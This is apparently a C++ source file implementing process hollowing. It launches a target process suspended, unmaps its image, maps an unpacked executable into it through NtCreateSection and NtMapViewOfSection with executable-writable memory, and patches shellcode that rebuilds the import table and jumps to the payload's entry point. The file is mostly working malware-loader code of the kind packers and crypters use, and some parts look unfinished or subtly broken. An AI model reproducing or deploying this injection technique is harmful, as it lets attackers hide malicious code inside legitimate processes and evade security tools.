#include "stdafx.h"
#include "Hollower.h"
#include "Shellcode.h"

Hollower::Hollower(std::wstring targetProcPath, IMAGE_DOS_HEADER *unpackedExe)
{
	this->path = targetProcPath;
	this->peData = new PEData(unpackedExe);

	HMODULE hmNtdll = GetModuleHandle(L"ntdll");

	this->NtUnmapViewOfSection = (TNtUnmapViewOfSection) GetProcAddress(hmNtdll, "NtUnmapViewOfSection");
	this->NtMapViewOfSection = (TNtMapViewOfSection)GetProcAddress(hmNtdll, "NtMapViewOfSection");
	this->NtCreateSection = (TNtCreateSection)GetProcAddress(hmNtdll, "NtCreateSection");
	
	//until we reach RET,0xcc,0xcc,0xcc
	while (*(DWORD*)(&((BYTE*)ContainsString)[this->containsStringSize-4]) != 0xccccccc3)
		this->containsStringSize++;

	//until we reach RET,0xcc,0xcc,0xcc
	while (*(DWORD*)(&((BYTE*)IATshellcode)[this->IATshellcodeSize-4]) != 0xccccccc3)
		(BYTE)this->IATshellcodeSize++;

	this->imageOffset = (void*)(this->containsStringSize + this->IATshellcodeSize + 0x1000);
}

__declspec(naked) void BootStrap(){
	__asm {
		pusha
		//call IATshellcodeAddr
		popa
		//jump EP
	}
}


void Hollower::ReMapExe()
{
	//remote base addr should be same as local base addr since we are hollowing same process
	this->NtUnmapViewOfSection(this->hProc, GetModuleHandle(NULL));
	HANDLE hSection;
	LARGE_INTEGER sMaxSize = { 0, 0 };
	sMaxSize.LowPart = this->peData->GetOptionalHeader()->SizeOfImage + (int)this->imageOffset;
	NTSTATUS status = this->NtCreateSection(&hSection, SECTION_MAP_EXECUTE | SECTION_MAP_READ | SECTION_MAP_WRITE, NULL, &sMaxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

	void *addr = this->peData->GetModuleBase();
	void* loadedExeSection = NULL;
	DWORD vSize = 0;
	status = this->NtMapViewOfSection(hSection, (HANDLE)0xffffffff, &this->loadedExeSection, NULL, NULL, NULL, &vSize, 2, NULL, PAGE_EXECUTE_READWRITE);
	status = this->NtMapViewOfSection(hSection, this->hProc, &this->remoteBase, NULL, NULL, NULL, &vSize, 2, NULL, PAGE_EXECUTE_READWRITE);

	std::vector<SectionInfo> sections = this->peData->GetSections();

	for (std::vector<SectionInfo>::iterator it = sections.begin(); it != sections.end(); ++it)
	{
		memcpy((void*)((int)this->loadedExeSection + (int)this->imageOffset + (int)it->_vOffset), (void*)((int)addr + it->_rOffset), it->_vSize);
	}
}

size_t Hollower::SerializeIATInfo()
{
	/*
	* SerializedIAT format
	* ---------------------
	* NULL - delimit function
	* NULL, NULL - delimit library (string after is always library name)
	* NULL, NULL, NULL - end of IAT info
	*
	*/

	IAT iat = this->peData->GetIAT();
	//lead with two nulls
	char* sectionPos = (char*)this->loadedExeSection+2;

	for (std::vector<Thunk>::iterator it = iat.thunks.begin(); it != iat.thunks.end(); ++it)
	{
		memcpy(sectionPos, it->libname.c_str(), it->libname.length());
		sectionPos += it->libname.length()+1;
		for (std::vector<std::string>::iterator itf = it->functionNames.begin(); itf != it->functionNames.end(); ++itf)
		{
			memcpy(sectionPos, itf->c_str(), itf->length());
			sectionPos += itf->length()+1;
		}
		//add extra NULL for lib delimeter
		sectionPos++;
	}
	return (size_t)((int)sectionPos - (int)this->loadedExeSection)+2;
}

void Hollower::WriteIATStub(size_t IATCodeoffset)
{
	int ContainsStringAddr = (int)this->loadedExeSection + IATCodeoffset;
	
	//copy ContainsString Function
	memcpy((void*)ContainsStringAddr, ContainsString, containsStringSize);

	int kernel32Str = ContainsStringAddr + containsStringSize + 0x20;
	//copy string table for shellcode
	lstrcpyW((wchar_t*)kernel32Str, L"KERNEL32.DLL");

	int loadlibraryStr = kernel32Str + 0x20;
	strcpy_s((char*)loadlibraryStr, sizeof("LoadLibraryA"),"LoadLibraryA");

	int getProcAddrStr = loadlibraryStr + 0x20;
	strcpy_s((char*)getProcAddrStr,sizeof("GetProcAddress"), "GetProcAddress");

	int IATShellcodeAddr = (int)this->loadedExeSection + IATCodeoffset + this->containsStringSize+0x300;
	//copy IATShellcode
	memcpy((void*)IATShellcodeAddr, IATshellcode, this->IATshellcodeSize);


	//Overwrite shellcode placeholders
	while ((size_t)IATShellcodeAddr<(IATShellcodeAddr + this->IATshellcodeSize))
	{
		//IAT info addr (aka Section Base)
		if (*(DWORD*)IATShellcodeAddr == SECTION_BASE_PLACEHOLDER) {
			*(DWORD*)IATShellcodeAddr = (DWORD)this->remoteBase;
		}
		//IAT offset addr
		else if (*(DWORD*)IATShellcodeAddr == IAT_LOCATION_PLACEHOLDER) {
			*(DWORD*)IATShellcodeAddr = (DWORD)this->remoteBase+(DWORD)this->imageOffset + (DWORD)this->peData->GetIAT().offset;
			
		}
		else if((*(DWORD*)IATShellcodeAddr == CONTAINS_STRING_PLACEHOLDER)) {
			*(DWORD*)IATShellcodeAddr = (DWORD)this->remoteBase + IATCodeoffset;
		}
		else if (*(DWORD*)IATShellcodeAddr == KERNEL32_PLACEHOLDER) {
			*(DWORD*)IATShellcodeAddr = (DWORD)this->remoteBase + (kernel32Str - (int)this->loadedExeSection);

		}
		else if ((*(DWORD*)IATShellcodeAddr == LOADLIBRARY_PLACEHOLDER)) {
			*(DWORD*)IATShellcodeAddr = (DWORD)this->remoteBase + (loadlibraryStr - (int)this->loadedExeSection);
		}
		else if ((*(DWORD*)IATShellcodeAddr == GETPROCADDRESS_PLACEHOLDER)) {
			*(DWORD*)IATShellcodeAddr = (DWORD)this->remoteBase + (getProcAddrStr - (int)this->loadedExeSection);
		}
		else if ((*(DWORD*)IATShellcodeAddr == OEP_PLACEHOLDER)) {
			*(DWORD*)IATShellcodeAddr = (DWORD)this->remoteBase + (DWORD)this->imageOffset + this->peData->GetEntryPoint();
			break;
		}
		(BYTE*)IATShellcodeAddr++;
	}

}

HANDLE Hollower::DoHollow()
{
	//sets hProc member with HANDLE result
	CreateSuspendedProcess();
	//Create section objects and map binary into remote process
	ReMapExe();
	//Serialize IAT info into remote section object
	size_t offset = SerializeIATInfo();
	//Write IAT stub which will process serialized IAT info
	WriteIATStub(offset);
	return this->hProc;
}


void Hollower::CreateSuspendedProcess()
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	memset(&si, 0, sizeof(si));

	si.cb = sizeof(STARTUPINFO);

	CreateProcess(path.c_str(), NULL, NULL, NULL, false, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	
	this->hProc = pi.hProcess;
}

Hollower::~Hollower()
{

}

